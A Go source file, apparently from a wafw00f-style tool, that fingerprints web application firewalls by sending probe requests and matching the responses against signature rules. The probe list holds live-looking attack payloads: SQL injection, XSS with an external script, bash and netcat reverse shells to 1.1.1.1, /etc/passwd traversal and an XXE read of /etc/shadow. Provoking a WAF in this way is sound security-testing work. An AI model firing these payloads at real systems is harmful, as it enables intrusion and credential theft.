package waf

import (
	"go-wafw00f/http"
	"regexp"
	"strings"
)

var httpClient http.Client

func init() {
	httpClient = http.Client{}
}

func DetectWaf(url string) []string {
	var results []string

	sqlPayloads := []string{
		"?id=1'%20union%20select%1%20from%20information_schema.tables%20--+",
		"?id=1/**/and/**/1=(updatexml(1,concat(0x3a,(database())),1))%23",
		"?id=1%20and/**/if((select%20count(schema_name)+" +
			"from/**/information_schema.schemata)=9,sleep(5),1)--+",
	}
	xssPayloads := []string{
		"?id=1<script>alert('test');</script>",
		"?id=1<scRiPt src='http://xxx/xss.js'></scRiPt>",
		"?id=1<iframe onload=alert('xss')>",
	}
	rcePayloads := []string{
		"?cmd=/bin/cat+/etc/passwd",
		"?cmd=bash+-i+>&+/dev/tcp/1.1.1.1/111+0>&1",
		"?cmd=nc+-v+1.1.1.1+1111+-e+/bin/bash",
	}
	includePayload := "?file=../../../../etc/passwd"
	xxePayload := "?id=<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><pwn>&hack;</pwn>"
	if !strings.HasSuffix(url, "/") {
		url = url + "/"
	}
	urlRe := regexp.MustCompile(`http.*?\..*?/`)
	match := urlRe.FindAllStringSubmatch(url, -1)

	rootUrl := strings.TrimRight(match[0][0], "/")
	var payloads []string
	payloads = append(append(append(append(payloads, sqlPayloads...),
		xssPayloads...), rcePayloads...), includePayload, xxePayload)

	for _, v := range payloads {
		_, headers, body := httpClient.DoGet(rootUrl+v, nil, nil)
		success, result := detect(headers, body)
		if success == true {
			results = append(results, result)
		}
	}

	results = removeRepeatedElement(results)
	return results
}

func detect(headers map[string]string, body []byte) (bool, string) {
	for _, item := range Waf.Items {
		flag := 0
		if item.ReHeaders != nil && len(item.ReHeaders) != 0 {
			for _, v := range item.ReHeaders {
				key := v.Key
				reValue := v.ReValue
				for innerK, innerV := range headers {
					if strings.ToLower(innerK) == strings.ToLower(key) {
						re := regexp.MustCompile(reValue)
						if re.MatchString(innerV) == true {
							flag++
						}
					}
				}
			}
		}
		if item.ReCookies != nil && len(item.ReCookies) != 0 {
			for _, v := range item.ReCookies {
				for innerK, innerV := range headers {
					if strings.ToLower(innerK) == "cookie" {
						re := regexp.MustCompile(v)
						if re.MatchString(innerV) == true {
							flag++
						}
					}
				}
			}
		}
		if item.ReContent != nil && len(item.ReContent) != 0 {
			for _, v := range item.ReContent {
				re := regexp.MustCompile(v)
				if re.MatchString(string(body)) == true {
					flag++
				}

			}
		}
		totalRule := len(item.ReContent) + len(item.ReCookies) + len(item.ReHeaders)
		if flag == totalRule && totalRule != 0 {
			return true, item.Name
		}
	}
	return false, "Not Detected"
}

func removeRepeatedElement(arr []string) (newArr []string) {
	newArr = make([]string, 0)
	for i := 0; i < len(arr); i++ {
		repeat := false
		for j := i + 1; j < len(arr); j++ {
			if arr[i] == arr[j] {
				repeat = true
				break
			}
		}
		if !repeat {
			newArr = append(newArr, arr[i])
		}
	}
	return
}
